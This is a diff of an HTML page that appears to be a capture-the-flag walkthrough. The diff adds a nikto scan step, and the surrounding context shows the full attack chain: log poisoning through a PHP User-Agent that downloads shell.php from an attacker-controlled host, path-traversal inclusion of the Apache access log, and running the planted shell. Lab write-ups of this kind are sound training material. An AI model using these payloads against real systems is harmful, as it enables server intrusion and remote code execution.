@@ -2733,6 +2733,13 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#nikto" class="md-nav__link">
+    nikto
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -4130,6 +4137,13 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#nikto" class="md-nav__link">
+    nikto
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -4245,8 +4259,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 You don&#39;t have permission to access this resource.
 Apache/2.4.38 (Debian)
 </code></pre></div>
+<h4 id="nikto">nikto</h4>
+<p>In this case running nikto doesn't reveal anything new:</p>
+<div class="highlight"><pre><span></span><code>nikto -h <span class="m">10</span>.10.46.238
+</code></pre></div>
 <h3 id="visit-website">Visit website</h3>
-<p>Once we visit the page on port 80 and click on dog or cat</p>
+<p>Let's visit the page on port 80 and click on dog or cat</p>
 <ul>
 <li>We can see a random dog or cat pic</li>
 <li>See url changes to ?view=dog or ?view=cat.</li>
@@ -4349,9 +4367,9 @@ $port = 9999;          // CHANGE THIS
 <span class="nb">print</span> <span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://10.9.182.239/?view=cat&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;?php file_put_contents(&quot;shell.php&quot;,file_get_contents(&quot;http://10.9.182.239:9090/shell.php&quot;)); ?&gt;&#39;</span><span class="p">,})</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
 </code></pre></div>
 <p>Use the previous technique to include the access log again:</p>
-<p><div class="highlight"><pre><span></span><code>?view=./cat/../../../../../../../../var/log/apache2/access<span class="err">&amp;</span>ext=.log
+<div class="highlight"><pre><span></span><code>?view=./cat/../../../../../../../../var/log/apache2/access<span class="err">&amp;</span>ext=.log
 </code></pre></div>
-You should not see our injected agent string because the injected php code is interpreted and executed and has no output. But you can see if this worked by checking the status of the python HTTP server.</p>
+<p>You should not see our injected agent string because the injected php code is interpreted and executed and has no output. But you can see if this worked by checking the status of the python HTTP server.</p>
 <p>We can now start the shell.php located in the the main web folder:</p>
 <div class="highlight"><pre><span></span><code>?view=./cat/../shell
 </code></pre></div>
